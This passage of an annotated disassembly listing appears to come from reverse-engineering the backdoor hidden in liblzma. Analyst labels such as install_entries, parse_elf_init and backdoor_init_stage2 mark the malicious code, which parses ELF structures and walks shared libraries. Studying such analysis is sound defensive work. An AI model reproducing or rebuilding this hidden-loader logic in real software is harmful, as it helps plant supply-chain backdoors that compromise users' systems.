.text.lzma_lzma_optimum_fasa:00000000000056B3                 mov     rcx, [rsp+0F8h+var_A0]
.text.lzma_lzma_optimum_fasa:00000000000056B8                 add     rsi, r14
.text.lzma_lzma_optimum_fasa:00000000000056BB                 lea     r9, [rsp+0F8h+var_90]
.text.lzma_lzma_optimum_fasa:00000000000056C0                 mov     [rsp+0F8h+var_D0], rsi
.text.lzma_lzma_optimum_fasa:00000000000056C5                 call    _Llzma_buf_cpy_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000056CA                 mov     r9, [rsp+0F8h+var_E8]
.text.lzma_lzma_optimum_fasa:00000000000056CF                 mov     rdx, r13
.text.lzma_lzma_optimum_fasa:00000000000056D2                 mov     rdi, r14
.text.lzma_lzma_optimum_fasa:00000000000056D5                 mov     rcx, [rsp+0F8h+var_A0]
.text.lzma_lzma_optimum_fasa:00000000000056DA                 mov     rsi, [rsp+0F8h+var_D0]
.text.lzma_lzma_optimum_fasa:00000000000056DF                 lea     r8, [rsp+0F8h+var_98]
.text.lzma_lzma_optimum_fasa:00000000000056E4                 mov     r15d, eax
.text.lzma_lzma_optimum_fasa:00000000000056E7                 call    sub_3330
.text.lzma_lzma_optimum_fasa:00000000000056EC                 mov     rsi, [rsp+0F8h+var_E0]
.text.lzma_lzma_optimum_fasa:00000000000056F1                 mov     edi, 0C28h
.text.lzma_lzma_optimum_fasa:00000000000056F6                 mov     r14d, eax
.text.lzma_lzma_optimum_fasa:00000000000056F9                 call    lzma_alloc      ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000056FE                 mov     [rbx+0C8h], rax
.text.lzma_lzma_optimum_fasa:0000000000005705                 pop     rdx
.text.lzma_lzma_optimum_fasa:0000000000005706                 pop     rcx
.text.lzma_lzma_optimum_fasa:0000000000005707                 test    rax, rax
.text.lzma_lzma_optimum_fasa:000000000000570A                 jz      short loc_5712
.text.lzma_lzma_optimum_fasa:000000000000570C                 inc     dword ptr [rbx+120h]
.text.lzma_lzma_optimum_fasa:0000000000005712
.text.lzma_lzma_optimum_fasa:0000000000005712 loc_5712:                               ; CODE XREF: install_entries+30A↑j
.text.lzma_lzma_optimum_fasa:0000000000005712                 test    r15d, r15d
.text.lzma_lzma_optimum_fasa:0000000000005715                 jz      short loc_5759
.text.lzma_lzma_optimum_fasa:0000000000005717                 test    r14d, r14d
.text.lzma_lzma_optimum_fasa:000000000000571A                 jz      short loc_5754
.text.lzma_lzma_optimum_fasa:000000000000571C                 mov     r13, [rsp+0E8h+var_90]
.text.lzma_lzma_optimum_fasa:0000000000005721                 mov     rdx, [rsp+0E8h+var_D8]
.text.lzma_lzma_optimum_fasa:0000000000005726                 mov     rcx, r12
.text.lzma_lzma_optimum_fasa:0000000000005729                 mov     rsi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:000000000000572D                 mov     rdi, r13
.text.lzma_lzma_optimum_fasa:0000000000005730                 cmp     r13, [rsp+0E8h+var_98]
.text.lzma_lzma_optimum_fasa:0000000000005735                 jnz     short loc_5763
.text.lzma_lzma_optimum_fasa:0000000000005737                 call    _Llzma_lzma2_encoder_memusage_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:000000000000573C                 cmp     eax, 7
.text.lzma_lzma_optimum_fasa:000000000000573F                 jbe     loc_57ED
.text.lzma_lzma_optimum_fasa:0000000000005745
.text.lzma_lzma_optimum_fasa:0000000000005745 loc_5745:                               ; CODE XREF: install_entries+3B3↓j
.text.lzma_lzma_optimum_fasa:0000000000005745                                         ; install_entries+3FB↓j
.text.lzma_lzma_optimum_fasa:0000000000005745                 mov     [r12+28h], r13
.text.lzma_lzma_optimum_fasa:000000000000574A                 mov     eax, 1
.text.lzma_lzma_optimum_fasa:000000000000574F                 jmp     loc_5800
.text.lzma_lzma_optimum_fasa:0000000000005754 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:0000000000005754
.text.lzma_lzma_optimum_fasa:0000000000005754 loc_5754:                               ; CODE XREF: install_entries+31A↑j
.text.lzma_lzma_optimum_fasa:0000000000005754                 test    r15d, r15d
.text.lzma_lzma_optimum_fasa:0000000000005757                 jnz     short loc_576D
.text.lzma_lzma_optimum_fasa:0000000000005759
.text.lzma_lzma_optimum_fasa:0000000000005759 loc_5759:                               ; CODE XREF: install_entries+315↑j
.text.lzma_lzma_optimum_fasa:0000000000005759                 test    r14d, r14d
.text.lzma_lzma_optimum_fasa:000000000000575C                 jz      short loc_57BA
.text.lzma_lzma_optimum_fasa:000000000000575E                 xor     r13d, r13d
.text.lzma_lzma_optimum_fasa:0000000000005761                 jmp     short loc_578D
.text.lzma_lzma_optimum_fasa:0000000000005763 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:0000000000005763
.text.lzma_lzma_optimum_fasa:0000000000005763 loc_5763:                               ; CODE XREF: install_entries+335↑j
.text.lzma_lzma_optimum_fasa:0000000000005763                 call    _Llzma_lzma2_encoder_memusage_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005768                 mov     r13d, eax
.text.lzma_lzma_optimum_fasa:000000000000576B                 jmp     short loc_578D
.text.lzma_lzma_optimum_fasa:000000000000576D ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:000000000000576D
.text.lzma_lzma_optimum_fasa:000000000000576D loc_576D:                               ; CODE XREF: install_entries+357↑j
.text.lzma_lzma_optimum_fasa:000000000000576D                 mov     rdx, [rsp+0E8h+var_D8]
.text.lzma_lzma_optimum_fasa:0000000000005772                 mov     rsi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:0000000000005776                 mov     rcx, r12
.text.lzma_lzma_optimum_fasa:0000000000005779                 mov     rdi, [rsp+0E8h+var_90]
.text.lzma_lzma_optimum_fasa:000000000000577E                 call    _Llzma_lzma2_encoder_memusage_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005783                 mov     r13d, eax
.text.lzma_lzma_optimum_fasa:0000000000005786                 xor     eax, eax
.text.lzma_lzma_optimum_fasa:0000000000005788                 test    r14d, r14d
.text.lzma_lzma_optimum_fasa:000000000000578B                 jz      short loc_57A3
.text.lzma_lzma_optimum_fasa:000000000000578D
.text.lzma_lzma_optimum_fasa:000000000000578D loc_578D:                               ; CODE XREF: install_entries+361↑j
.text.lzma_lzma_optimum_fasa:000000000000578D                                         ; install_entries+36B↑j
.text.lzma_lzma_optimum_fasa:000000000000578D                 mov     rdx, [rsp+0E8h+var_D8]
.text.lzma_lzma_optimum_fasa:0000000000005792                 mov     rsi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:0000000000005796                 mov     rcx, r12
.text.lzma_lzma_optimum_fasa:0000000000005799                 mov     rdi, [rsp+0E8h+var_98]
.text.lzma_lzma_optimum_fasa:000000000000579E                 call    _Llzma_lzma2_encoder_memusage_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000057A3
.text.lzma_lzma_optimum_fasa:00000000000057A3 loc_57A3:                               ; CODE XREF: install_entries+38B↑j
.text.lzma_lzma_optimum_fasa:00000000000057A3                 cmp     r13d, eax
.text.lzma_lzma_optimum_fasa:00000000000057A6                 jb      short loc_57B5
.text.lzma_lzma_optimum_fasa:00000000000057A8                 cmp     r13d, 7
.text.lzma_lzma_optimum_fasa:00000000000057AC                 jbe     short loc_57B5
.text.lzma_lzma_optimum_fasa:00000000000057AE                 mov     r13, [rsp+0E8h+var_90]
.text.lzma_lzma_optimum_fasa:00000000000057B3                 jmp     short loc_5745
.text.lzma_lzma_optimum_fasa:00000000000057B5 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:00000000000057B5
.text.lzma_lzma_optimum_fasa:00000000000057B5 loc_57B5:                               ; CODE XREF: install_entries+3A6↑j
.text.lzma_lzma_optimum_fasa:00000000000057B5                                         ; install_entries+3AC↑j
.text.lzma_lzma_optimum_fasa:00000000000057B5                 cmp     eax, r13d
.text.lzma_lzma_optimum_fasa:00000000000057B8                 jnb     short loc_57F1
.text.lzma_lzma_optimum_fasa:00000000000057BA
.text.lzma_lzma_optimum_fasa:00000000000057BA loc_57BA:                               ; CODE XREF: install_entries+35C↑j
.text.lzma_lzma_optimum_fasa:00000000000057BA                                         ; install_entries+3F4↓j
.text.lzma_lzma_optimum_fasa:00000000000057BA                 mov     rdi, [rbx+80h]
.text.lzma_lzma_optimum_fasa:00000000000057C1                 mov     rsi, [rsp+0E8h+var_E0]
.text.lzma_lzma_optimum_fasa:00000000000057C6                 call    lzma_free       ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000057CB                 mov     rdi, [rbx+0A0h]
.text.lzma_lzma_optimum_fasa:00000000000057D2                 mov     rsi, [rsp+0E8h+var_E0]
.text.lzma_lzma_optimum_fasa:00000000000057D7                 call    lzma_free       ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000057DC                 mov     rdi, [rbx+0C8h]
.text.lzma_lzma_optimum_fasa:00000000000057E3                 mov     rsi, [rsp+0E8h+var_E0]
.text.lzma_lzma_optimum_fasa:00000000000057E8                 call    lzma_free       ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000057ED
.text.lzma_lzma_optimum_fasa:00000000000057ED loc_57ED:                               ; CODE XREF: install_entries+3B↑j
.text.lzma_lzma_optimum_fasa:00000000000057ED                                         ; install_entries+106↑j ...
.text.lzma_lzma_optimum_fasa:00000000000057ED                 xor     eax, eax
.text.lzma_lzma_optimum_fasa:00000000000057EF                 jmp     short loc_5800
.text.lzma_lzma_optimum_fasa:00000000000057F1 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:00000000000057F1
.text.lzma_lzma_optimum_fasa:00000000000057F1 loc_57F1:                               ; CODE XREF: install_entries+3B8↑j
.text.lzma_lzma_optimum_fasa:00000000000057F1                 cmp     eax, 7
.text.lzma_lzma_optimum_fasa:00000000000057F4                 jbe     short loc_57BA
.text.lzma_lzma_optimum_fasa:00000000000057F6                 mov     r13, [rsp+0E8h+var_98]
.text.lzma_lzma_optimum_fasa:00000000000057FB                 jmp     loc_5745
.text.lzma_lzma_optimum_fasa:0000000000005800 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:0000000000005800
.text.lzma_lzma_optimum_fasa:0000000000005800 loc_5800:                               ; CODE XREF: install_entries+34F↑j
.text.lzma_lzma_optimum_fasa:0000000000005800                                         ; install_entries+3EF↑j
.text.lzma_lzma_optimum_fasa:0000000000005800                 add     rsp, 0C0h
.text.lzma_lzma_optimum_fasa:0000000000005807                 pop     rbx
.text.lzma_lzma_optimum_fasa:0000000000005808                 pop     r12
.text.lzma_lzma_optimum_fasa:000000000000580A                 pop     r13
.text.lzma_lzma_optimum_fasa:000000000000580C                 pop     r14
.text.lzma_lzma_optimum_fasa:000000000000580E                 pop     r15
.text.lzma_lzma_optimum_fasa:0000000000005810                 retn
.text.lzma_lzma_optimum_fasa:0000000000005810 install_entries endp
.text.lzma_lzma_optimum_fasa:0000000000005810
.text.lzma_lzma_optimum_fasa:0000000000005810 _text_lzma_lzma_optimum_fasa ends
.text.lzma_lzma_optimum_fasa:0000000000005810
.text.microlzma_encoder_inia:0000000000005820 ; ===========================================================================
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820 ; Segment type: Pure code
.text.microlzma_encoder_inia:0000000000005820 ; Segment permissions: Read/Execute
.text.microlzma_encoder_inia:0000000000005820 _text_microlzma_encoder_inia segment para public 'CODE' use64
.text.microlzma_encoder_inia:0000000000005820                 assume cs:_text_microlzma_encoder_inia
.text.microlzma_encoder_inia:0000000000005820                 ;org 5820h
.text.microlzma_encoder_inia:0000000000005820                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820 ; =============== S U B R O U T I N E =======================================
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820 ; __int64 __fastcall parse_elf_init(struc_init22 *init)
.text.microlzma_encoder_inia:0000000000005820                 public parse_elf_init
.text.microlzma_encoder_inia:0000000000005820 parse_elf_init  proc near               ; CODE XREF: backdoor_init_stage2+EE↓p
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820 var_B58         = qword ptr -0B58h
.text.microlzma_encoder_inia:0000000000005820 var_B50         = qword ptr -0B50h
.text.microlzma_encoder_inia:0000000000005820 var_B48         = qword ptr -0B48h
.text.microlzma_encoder_inia:0000000000005820 var_B40         = qword ptr -0B40h
.text.microlzma_encoder_inia:0000000000005820 var_B38         = qword ptr -0B38h
.text.microlzma_encoder_inia:0000000000005820 var_B30         = qword ptr -0B30h
.text.microlzma_encoder_inia:0000000000005820 var_B28         = qword ptr -0B28h
.text.microlzma_encoder_inia:0000000000005820 var_B20         = qword ptr -0B20h
.text.microlzma_encoder_inia:0000000000005820 var_B18         = qword ptr -0B18h
.text.microlzma_encoder_inia:0000000000005820 var_B10         = qword ptr -0B10h
.text.microlzma_encoder_inia:0000000000005820 var_B08         = qword ptr -0B08h
.text.microlzma_encoder_inia:0000000000005820 var_B00         = qword ptr -0B00h
.text.microlzma_encoder_inia:0000000000005820 var_AF8         = qword ptr -0AF8h
.text.microlzma_encoder_inia:0000000000005820 var_AF0         = qword ptr -0AF0h
.text.microlzma_encoder_inia:0000000000005820 var_AE8         = qword ptr -0AE8h
.text.microlzma_encoder_inia:0000000000005820 var_ADA         = byte ptr -0ADAh
.text.microlzma_encoder_inia:0000000000005820 var_AD9         = byte ptr -0AD9h
.text.microlzma_encoder_inia:0000000000005820 var_ACC         = dword ptr -0ACCh
.text.microlzma_encoder_inia:0000000000005820 var_AC8         = qword ptr -0AC8h
.text.microlzma_encoder_inia:0000000000005820 var_AC0         = qword ptr -0AC0h
.text.microlzma_encoder_inia:0000000000005820 var_AB8         = qword ptr -0AB8h
.text.microlzma_encoder_inia:0000000000005820 var_AB0         = qword ptr -0AB0h
.text.microlzma_encoder_inia:0000000000005820 var_AA8         = qword ptr -0AA8h
.text.microlzma_encoder_inia:0000000000005820 var_AA0         = qword ptr -0AA0h
.text.microlzma_encoder_inia:0000000000005820 var_A98         = qword ptr -0A98h
.text.microlzma_encoder_inia:0000000000005820 var_A90         = qword ptr -0A90h
.text.microlzma_encoder_inia:0000000000005820 var_A88         = qword ptr -0A88h
.text.microlzma_encoder_inia:0000000000005820 var_A80         = qword ptr -0A80h
.text.microlzma_encoder_inia:0000000000005820 var_A78         = qword ptr -0A78h
.text.microlzma_encoder_inia:0000000000005820 var_A70         = qword ptr -0A70h
.text.microlzma_encoder_inia:0000000000005820 var_A68         = qword ptr -0A68h
.text.microlzma_encoder_inia:0000000000005820 var_A60         = qword ptr -0A60h
.text.microlzma_encoder_inia:0000000000005820 var_A58         = qword ptr -0A58h
.text.microlzma_encoder_inia:0000000000005820 var_A50         = qword ptr -0A50h
.text.microlzma_encoder_inia:0000000000005820 var_A48         = qword ptr -0A48h
.text.microlzma_encoder_inia:0000000000005820 var_A40         = qword ptr -0A40h
.text.microlzma_encoder_inia:0000000000005820 var_A38         = qword ptr -0A38h
.text.microlzma_encoder_inia:0000000000005820 var_A30         = qword ptr -0A30h
.text.microlzma_encoder_inia:0000000000005820 var_A28         = qword ptr -0A28h
.text.microlzma_encoder_inia:0000000000005820 var_A20         = word ptr -0A20h
.text.microlzma_encoder_inia:0000000000005820 var_A15         = byte ptr -0A15h
.text.microlzma_encoder_inia:0000000000005820 var_A13         = byte ptr -0A13h
.text.microlzma_encoder_inia:0000000000005820 var_A12         = byte ptr -0A12h
.text.microlzma_encoder_inia:0000000000005820 var_A11         = byte ptr -0A11h
.text.microlzma_encoder_inia:0000000000005820 var_A10         = byte ptr -0A10h
.text.microlzma_encoder_inia:0000000000005820 var_A08         = dword ptr -0A08h
.text.microlzma_encoder_inia:0000000000005820 var_A00         = qword ptr -0A00h
.text.microlzma_encoder_inia:0000000000005820 var_9F0         = qword ptr -9F0h
.text.microlzma_encoder_inia:0000000000005820 var_9D8         = qword ptr -9D8h
.text.microlzma_encoder_inia:0000000000005820 var_9D0         = qword ptr -9D0h
.text.microlzma_encoder_inia:0000000000005820 var_9C8         = word ptr -9C8h
.text.microlzma_encoder_inia:0000000000005820 var_9BD         = byte ptr -9BDh
.text.microlzma_encoder_inia:0000000000005820 var_9BA         = byte ptr -9BAh
.text.microlzma_encoder_inia:0000000000005820 anonymous_10    = byte ptr -9B8h
.text.microlzma_encoder_inia:0000000000005820 anonymous_11    = qword ptr -9A8h
.text.microlzma_encoder_inia:0000000000005820 anonymous_5     = qword ptr -998h
.text.microlzma_encoder_inia:0000000000005820 anonymous_7     = struc_parse_elf ptr -980h
.text.microlzma_encoder_inia:0000000000005820 anonymous_0     = qword ptr -160h
.text.microlzma_encoder_inia:0000000000005820 anonymous_1     = qword ptr -158h
.text.microlzma_encoder_inia:0000000000005820 anonymous_2     = qword ptr -80h
.text.microlzma_encoder_inia:0000000000005820 anonymous_3     = qword ptr -60h
.text.microlzma_encoder_inia:0000000000005820 anonymous_4     = qword ptr -58h
.text.microlzma_encoder_inia:0000000000005820 anonymous_6     = byte ptr -48h
.text.microlzma_encoder_inia:0000000000005820 glo_allocator   = qword ptr -30h
.text.microlzma_encoder_inia:0000000000005820 var_28          = qword ptr -28h
.text.microlzma_encoder_inia:0000000000005820 var_20          = qword ptr -20h
.text.microlzma_encoder_inia:0000000000005820 var_18          = qword ptr -18h
.text.microlzma_encoder_inia:0000000000005820 var_10          = qword ptr -10h
.text.microlzma_encoder_inia:0000000000005820 var_8           = qword ptr -8
.text.microlzma_encoder_inia:0000000000005820
.text.microlzma_encoder_inia:0000000000005820                 endbr64
.text.microlzma_encoder_inia:0000000000005824                 push    r15
.text.microlzma_encoder_inia:0000000000005826                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005828                 mov     r15, rdi
.text.microlzma_encoder_inia:000000000000582B                 mov     ecx, 256h
.text.microlzma_encoder_inia:0000000000005830                 push    r14
.text.microlzma_encoder_inia:0000000000005832                 xor     esi, esi
.text.microlzma_encoder_inia:0000000000005834                 push    r13
.text.microlzma_encoder_inia:0000000000005836                 push    r12
.text.microlzma_encoder_inia:0000000000005838                 push    rbx
.text.microlzma_encoder_inia:0000000000005839                 sub     rsp, 0B30h
.text.microlzma_encoder_inia:0000000000005840                 lea     rdi, [rsp+0B58h+anonymous_7]
.text.microlzma_encoder_inia:0000000000005848                 lea     r14, [rsp+0B58h+anonymous_7]
.text.microlzma_encoder_inia:0000000000005850                 mov     [rsp+0B58h+var_ACC], esi
.text.microlzma_encoder_inia:0000000000005857                 rep stosd
.text.microlzma_encoder_inia:0000000000005859                 lea     rax, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000005861                 xor     edi, edi
.text.microlzma_encoder_inia:0000000000005863                 mov     rcx, [r15+80h]
.text.microlzma_encoder_inia:000000000000586A                 mov     [rsp+0B58h+var_B58], rax
.text.microlzma_encoder_inia:000000000000586E                 lea     r13, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:0000000000005876                 mov     [rsp+0B58h+anonymous_7.elf_info_arr], rax
.text.microlzma_encoder_inia:000000000000587E                 lea     rax, [rsp+0B58h+anonymous_7.elf_infos.elf_hdr+100h]
.text.microlzma_encoder_inia:0000000000005886                 mov     [rsp+0B58h+anonymous_7.elf_info_arr+8], rax
.text.microlzma_encoder_inia:000000000000588E                 lea     rax, [rsp+0B58h+anonymous_7.elf_infos.elf_hdr+200h]
.text.microlzma_encoder_inia:0000000000005896                 mov     [rsp+0B58h+anonymous_7.elf_info_arr+10h], rax
.text.microlzma_encoder_inia:000000000000589E                 lea     rax, [rsp+0B58h+anonymous_7.elf_infos.elf_hdr+300h]
.text.microlzma_encoder_inia:00000000000058A6                 mov     [rsp+0B58h+var_AC8], rdi
.text.microlzma_encoder_inia:00000000000058AE                 mov     [rsp+0B58h+var_AC0], rdi
.text.microlzma_encoder_inia:00000000000058B6                 mov     [rsp+0B58h+var_AB8], rdi
.text.microlzma_encoder_inia:00000000000058BE                 mov     [rsp+0B58h+var_AB0], rdi
.text.microlzma_encoder_inia:00000000000058C6                 mov     [rsp+0B58h+var_AA8], rdi
.text.microlzma_encoder_inia:00000000000058CE                 mov     rdi, rcx
.text.microlzma_encoder_inia:00000000000058D1                 mov     [rsp+0B58h+anonymous_7.elf_info_arr+18h], rax
.text.microlzma_encoder_inia:00000000000058D9                 lea     rax, [rsp+0B58h+anonymous_7.elf_infos.elf_hdr+400h]
.text.microlzma_encoder_inia:00000000000058E1                 mov     [rsp+0B58h+anonymous_7.elf_info_arr+20h], rax
.text.microlzma_encoder_inia:00000000000058E9                 mov     [rsp+0B58h+anonymous_7.self_addr], r14
.text.microlzma_encoder_inia:00000000000058F1                 mov     [rsp+0B58h+anonymous_7.elf_arrptr], r13
.text.microlzma_encoder_inia:00000000000058F9                 call    get_ehdr_address ; PIC mode
.text.microlzma_encoder_inia:00000000000058FE                 movzx   eax, byte ptr [rcx+10h]
.text.microlzma_encoder_inia:0000000000005902                 mov     rdx, [rcx+8]
.text.microlzma_encoder_inia:0000000000005906                 mov     [rcx+18h], rax
.text.microlzma_encoder_inia:000000000000590A                 mov     rbx, [rdx+rax*8+18h]
.text.microlzma_encoder_inia:000000000000590F                 mov     rax, [rcx+28h]
.text.microlzma_encoder_inia:0000000000005913                 mov     rdx, rax
.text.microlzma_encoder_inia:0000000000005916                 sub     rdx, rbx
.text.microlzma_encoder_inia:0000000000005919                 cmp     rbx, rax
.text.microlzma_encoder_inia:000000000000591C                 jb      short loc_5924
.text.microlzma_encoder_inia:000000000000591E                 mov     rdx, rbx
.text.microlzma_encoder_inia:0000000000005921                 sub     rdx, rax
.text.microlzma_encoder_inia:0000000000005924
.text.microlzma_encoder_inia:0000000000005924 loc_5924:                               ; CODE XREF: parse_elf_init+FC↑j
.text.microlzma_encoder_inia:0000000000005924                 cmp     rdx, 50000h
.text.microlzma_encoder_inia:000000000000592B                 jg      loc_5A4B
.text.microlzma_encoder_inia:0000000000005931                 and     rbx, 0FFFFFFFFFFFFF000h
.text.microlzma_encoder_inia:0000000000005938                 lea     r12, [rbx-20000h]
.text.microlzma_encoder_inia:000000000000593F
.text.microlzma_encoder_inia:000000000000593F loc_593F:                               ; CODE XREF: parse_elf_init+13A↓j
.text.microlzma_encoder_inia:000000000000593F                 xor     esi, esi        ; a2
.text.microlzma_encoder_inia:0000000000005941                 mov     rdi, rbx        ; a1
.text.microlzma_encoder_inia:0000000000005944                 call    table_get       ; PIC mode
.text.microlzma_encoder_inia:0000000000005949                 cmp     eax, 300h
.text.microlzma_encoder_inia:000000000000594E                 jz      short loc_5961
.text.microlzma_encoder_inia:0000000000005950                 sub     rbx, 1000h
.text.microlzma_encoder_inia:0000000000005957                 cmp     rbx, r12
.text.microlzma_encoder_inia:000000000000595A                 jnz     short loc_593F
.text.microlzma_encoder_inia:000000000000595C                 jmp     loc_5A4B
.text.microlzma_encoder_inia:0000000000005961 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000005961
.text.microlzma_encoder_inia:0000000000005961 loc_5961:                               ; CODE XREF: parse_elf_init+12E↑j
.text.microlzma_encoder_inia:0000000000005961                 lea     rax, [rsp+0B58h+var_AA8]
.text.microlzma_encoder_inia:0000000000005969                 lea     rdi, [rsp+0B58h+var_A88]
.text.microlzma_encoder_inia:0000000000005971                 mov     [rsp+0B58h+var_A88], r13
.text.microlzma_encoder_inia:0000000000005979                 mov     [rsp+0B58h+var_A78], rax
.text.microlzma_encoder_inia:0000000000005981                 mov     rax, [r15+80h]
.text.microlzma_encoder_inia:0000000000005988                 mov     [rsp+0B58h+var_A80], rbx
.text.microlzma_encoder_inia:0000000000005990                 mov     rax, [rax+28h]
.text.microlzma_encoder_inia:0000000000005994                 mov     [rsp+0B58h+var_A70], rax
.text.microlzma_encoder_inia:000000000000599C                 call    parse_elf_invoke ; PIC mode
.text.microlzma_encoder_inia:00000000000059A1                 test    eax, eax
.text.microlzma_encoder_inia:00000000000059A3                 jz      loc_5A4B
.text.microlzma_encoder_inia:00000000000059A9                 mov     edi, 1          ; _QWORD
.text.microlzma_encoder_inia:00000000000059AE                 call    get_lzma_allocator ; PIC mode
.text.microlzma_encoder_inia:00000000000059B3                 xor     edx, edx
.text.microlzma_encoder_inia:00000000000059B5                 lea     rcx, [rsp+0B58h+anonymous_6]
.text.microlzma_encoder_inia:00000000000059BD                 mov     [rsp+0B58h+glo_allocator], rax
.text.microlzma_encoder_inia:00000000000059C5
.text.microlzma_encoder_inia:00000000000059C5 loc_59C5:                               ; CODE XREF: parse_elf_init+1B4↓j
.text.microlzma_encoder_inia:00000000000059C5                 mov     sil, [rax+rdx]
.text.microlzma_encoder_inia:00000000000059C9                 mov     [rcx+rdx], sil
.text.microlzma_encoder_inia:00000000000059CD                 inc     rdx
.text.microlzma_encoder_inia:00000000000059D0                 cmp     rdx, 18h
.text.microlzma_encoder_inia:00000000000059D4                 jnz     short loc_59C5
.text.microlzma_encoder_inia:00000000000059D6                 lea     rax, [rsp+0B58h+var_AC0]
.text.microlzma_encoder_inia:00000000000059DE                 lea     r12, [rsp+740h]
.text.microlzma_encoder_inia:00000000000059E6                 mov     [rsp+0B58h+var_A68], r14
.text.microlzma_encoder_inia:00000000000059EE                 mov     [rsp+0B58h+var_A58], rax
.text.microlzma_encoder_inia:00000000000059F6                 lea     rax, [rsp+0B58h+var_AB8]
.text.microlzma_encoder_inia:00000000000059FE                 lea     rdi, [rsp+0B58h+var_A68]
.text.microlzma_encoder_inia:0000000000005A06                 mov     [rsp+0B58h+var_A50], rax
.text.microlzma_encoder_inia:0000000000005A0E                 lea     rax, [rsp+0B58h+var_AB0]
.text.microlzma_encoder_inia:0000000000005A16                 mov     [rsp+0B58h+var_A48], rax
.text.microlzma_encoder_inia:0000000000005A1E                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005A22                 mov     [rsp+0B58h+var_A60], r13
.text.microlzma_encoder_inia:0000000000005A2A                 mov     rax, [rax+38h]
.text.microlzma_encoder_inia:0000000000005A2E                 mov     [rsp+0B58h+var_A38], r12
.text.microlzma_encoder_inia:0000000000005A36                 mov     [rsp+0B58h+var_A40], rax
.text.microlzma_encoder_inia:0000000000005A3E                 call    process_shared_libraries ; PIC mode
.text.microlzma_encoder_inia:0000000000005A43                 test    eax, eax
.text.microlzma_encoder_inia:0000000000005A45                 jnz     loc_5AE1
.text.microlzma_encoder_inia:0000000000005A4B
.text.microlzma_encoder_inia:0000000000005A4B loc_5A4B:                               ; CODE XREF: parse_elf_init+10B↑j
.text.microlzma_encoder_inia:0000000000005A4B                                         ; parse_elf_init+13C↑j ...
.text.microlzma_encoder_inia:0000000000005A4B                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000005A4D                 mov     [rsp+0B58h+var_B10], rdx
.text.microlzma_encoder_inia:0000000000005A52
.text.microlzma_encoder_inia:0000000000005A52 loc_5A52:                               ; CODE XREF: parse_elf_init+394↓j
.text.microlzma_encoder_inia:0000000000005A52                                         ; parse_elf_init+517↓j ...
.text.microlzma_encoder_inia:0000000000005A52                 mov     rdi, [rsp+0B58h+var_B10]
.text.microlzma_encoder_inia:0000000000005A57                 lea     rsi, [rsp+0B58h+anonymous_6]
.text.microlzma_encoder_inia:0000000000005A5F                 call    sub_2760
.text.microlzma_encoder_inia:0000000000005A64                 mov     rdx, [rsp+0B58h+glo_allocator]
.text.microlzma_encoder_inia:0000000000005A6C                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005A6E                 test    rdx, rdx
.text.microlzma_encoder_inia:0000000000005A71
.text.microlzma_encoder_inia:0000000000005A71 loc_5A71:                               ; CODE XREF: parse_elf_init+2BF↓j
.text.microlzma_encoder_inia:0000000000005A71                 jnz     short loc_5AD2
.text.microlzma_encoder_inia:0000000000005A73                 lea     rdx, [rsp+0B58h+anonymous_7]
.text.microlzma_encoder_inia:0000000000005A7B                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005A7D                 mov     ecx, 256h
.text.microlzma_encoder_inia:0000000000005A82                 xor     esi, esi
.text.microlzma_encoder_inia:0000000000005A84                 mov     rdi, rdx
.text.microlzma_encoder_inia:0000000000005A87                 rep stosd
.text.microlzma_encoder_inia:0000000000005A89                 mov     rdi, [r15+80h]
.text.microlzma_encoder_inia:0000000000005A90
.text.microlzma_encoder_inia:0000000000005A90 loc_5A90:                               ; CODE XREF: parse_elf_init+168E↓j
.text.microlzma_encoder_inia:0000000000005A90                 call    _Llzma_block_param_decoder_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005A95                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005A97                 mov     qword ptr [rdi], 1
.text.microlzma_encoder_inia:0000000000005A9E                 mov     [rdi+8], rax
.text.microlzma_encoder_inia:0000000000005AA2                 mov     [rdi+10h], rax
.text.microlzma_encoder_inia:0000000000005AA6                 mov     [rdi+18h], rax
.text.microlzma_encoder_inia:0000000000005AAA                 mov     [rdi+20h], rax
.text.microlzma_encoder_inia:0000000000005AAE                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005AB0                 cpuid
.text.microlzma_encoder_inia:0000000000005AB2                 test    eax, eax
.text.microlzma_encoder_inia:0000000000005AB4                 jz      loc_6F41
.text.microlzma_encoder_inia:0000000000005ABA                 mov     eax, 1
.text.microlzma_encoder_inia:0000000000005ABF                 cpuid
.text.microlzma_encoder_inia:0000000000005AC1                 mov     [rdi+8], eax
.text.microlzma_encoder_inia:0000000000005AC4                 mov     [rdi+10h], ebx
